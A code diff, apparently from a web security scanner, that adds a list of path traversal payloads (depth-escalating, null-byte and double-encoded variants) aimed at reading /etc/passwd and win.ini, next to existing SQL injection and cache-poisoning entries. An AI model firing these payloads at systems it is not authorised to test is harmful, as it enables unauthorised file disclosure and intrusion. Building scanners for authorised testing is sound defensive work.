@@ -139,6 +139,23 @@ SQLI_MULTIBYTE_TWINS: list[tuple[str, str]] = [
     ("EUC-KR", "%a1%27"),
 ]
 
+# --- Path traversal / LFI: depth-escalating + encoding variants, content-disclosure only ---
+# Reads only universally-present, non-sensitive files (/etc/passwd, win.ini) to prove
+# the traversal reaches the filesystem — never app source, credentials, or config.
+# (label, payload, is_raw) — is_raw payloads are already percent-encoded and must not
+# be re-encoded by the caller.
+LFI_PAYLOADS: list[tuple[str, str, bool]] = [
+    ("unix-depth1", "../etc/passwd", False),
+    ("unix-depth3", "../../../etc/passwd", False),
+    ("unix-depth6", "../../../../../../etc/passwd", False),
+    ("unix-depth8", "../../../../../../../../etc/passwd", False),
+    ("unix-null-byte", "../../../../etc/passwd%00", True),
+    ("unix-double-encoded", "%252e%252e%252fetc%252fpasswd", True),
+    ("windows-depth3", "..\\..\\..\\windows\\win.ini", False),
+    ("windows-depth6", "..\\..\\..\\..\\..\\..\\windows\\win.ini", False),
+]
+
+
 # --- Cache poisoning: unkeyed headers that frameworks often reflect ---
 CACHE_HEADERS = [
     "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Server",
